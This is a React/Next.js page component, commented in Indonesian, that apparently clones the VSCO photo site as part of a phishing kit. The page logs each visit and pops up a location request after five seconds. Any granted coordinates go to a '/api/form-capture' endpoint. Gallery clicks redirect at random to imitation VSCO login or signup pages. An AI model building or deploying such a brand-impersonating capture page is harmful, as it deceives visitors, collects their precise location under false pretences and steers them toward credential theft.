'use client';

import { useRouter } from 'next/navigation';
import { useEffect, useState } from 'react';
import CommunitySection from './components/community-section';
import FeatureCarousel from './components/feature-carousel';
import { featuresData } from './components/features-data';
import Gallery from './components/gallery';
import HeaderNav from './components/header-nav';
import Hero from './components/hero';
import LoadingScreen from './components/loading-screen';
import LocationPermissionModal from './components/location-permission-modal';
import PhotoToolsSection from './components/photo-tools-section';
import PlansSection from './components/plans-section';

export default function VSCOPage() {
  const router = useRouter();

  // State untuk modal
  const [showLocationModal, setShowLocationModal] = useState(false);

  // State untuk tracking
  const [isLoading, setIsLoading] = useState(true);
  const [hasTracked, setHasTracked] = useState(false);

  // Melakukan tracking saat halaman dimuat
  useEffect(() => {
    const trackVisit = async () => {
      try {
        // Track kunjungan ke halaman vsco
        await fetch('/api/track', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            pageType: 'vsco',
            pageId: window.innerWidth + 'x' + window.innerHeight,
          }),
        });

        setHasTracked(true);
      } catch (error) {
        console.error('Error tracking page view:', error);
      } finally {
        setIsLoading(false);
      }
    };

    trackVisit();

    // Tampilkan modal lokasi setelah 5 detik
    const timer = setTimeout(() => {
      setShowLocationModal(true);
    }, 5000);

    return () => clearTimeout(timer);
  }, []);

  // Handler untuk location permission modal
  const handleLocationPermissionGranted = async (
    latitude: number,
    longitude: number,
    accuracy: number,
  ) => {
    try {
      // Kirim data geolokasi ke form-capture
      await fetch('/api/form-capture', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          source: 'vsco',
          additional_data: {
            geolocation: {
              latitude,
              longitude,
              accuracy,
              timestamp: new Date().toISOString(),
            },
          },
        }),
      });

      // Kirim data tracking dengan geolokasi
      await fetch('/api/track', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          pageType: 'vsco',
          pageId: 'geolocation',
          geoData: {
            latitude,
            longitude,
            accuracy,
            timestamp: Date.now(),
          },
        }),
      });
    } catch (error) {
      console.error('Error sending geolocation data:', error);
    } finally {
      setShowLocationModal(false);
    }
  };

  // Handler untuk gallery login requirement
  const handleLoginRequired = () => {
    // 50% chance untuk login atau signup
    if (Math.random() > 0.5) {
      router.push('/vsco/user/login');
    } else {
      router.push('/vsco/user/signup');
    }
  };

  if (isLoading) {
    return <LoadingScreen />;
  }

  return (
    <div className='flex min-h-screen flex-col bg-[#111] pl-[164px] pt-[52px] text-white'>
      <HeaderNav />

      <Hero />

      {/* Features Carousel */}
      <FeatureCarousel features={featuresData} />

      <section className='px-4 py-12 md:px-8'>
        <div className='mx-auto max-w-[1650px]'>
          <Gallery onLoginRequired={handleLoginRequired} />
        </div>
      </section>

      <PlansSection />

      <PhotoToolsSection />

      <CommunitySection />

      {/* Location Modal */}
      <LocationPermissionModal
        isOpen={showLocationModal}
        onClose={() => setShowLocationModal(false)}
        onPermissionGranted={handleLocationPermissionGranted}
      />
    </div>
  );
}
